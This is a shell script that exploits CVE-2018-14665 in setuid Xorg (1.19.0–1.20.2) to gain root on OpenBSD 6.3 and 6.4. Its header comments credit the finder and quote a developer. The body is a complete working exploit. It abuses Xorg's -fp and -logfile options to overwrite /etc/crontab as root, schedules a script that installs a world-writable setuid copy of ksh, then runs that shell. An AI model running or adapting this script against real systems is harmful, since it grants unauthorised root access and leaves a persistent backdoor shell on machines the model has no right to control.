#!/bin/sh
# local privilege escalation in X11 currently
# unpatched in OpenBSD 6.4 stable - exploit
# uses cve-2018-14665 to overwrite files as root. 
# Impacts Xorg 1.19.0 - 1.20.2 which ships setuid
# and vulnerable in default OpenBSD. Errata: was 
# unpatched 0day for a day on release by Xorg for
# OpenBSD systems - patched 26-10-2018.
# 
# Credit for cve-2018-14665 goes to Narendra Shinde.
# Theo explains why this flaw made it into OpenBSD
# stable releases (tested 6.3 & 6.4) as 0day himself 
# here:
#
# https://marc.info/?l=openbsd-tech&r=1&b=201810&w=2
#
# "That is the first localhost root hole in quite a 
# long time." - Theo de Raadt 25/10/18
#
# This exploit works on OpenBSD 6.3 and 6.4. 
#
# - https://hacker.house
#!/bin/sh
echo '[+] OpenBSD 6.3/6.4 X11R6 1.19.0 <= 1.20.2 local root exploit'
cat > /tmp/.xsh << EOF
cp /bin/ksh /usr/local/bin/xshell2
chmod 4777 /usr/local/bin/xshell2
EOF
chmod 755 /tmp/.xsh
cd /etc
Xorg -fp '* * * * * root /tmp/.xsh' -logfile crontab :1 &
sleep 5
pkill Xorg
echo '[-] waiting for crontab to run, clean up /etc/crontab'
sleep 90
echo '[-] running /usr/local/bin/xshell2... got root?'
/usr/local/bin/xshell2
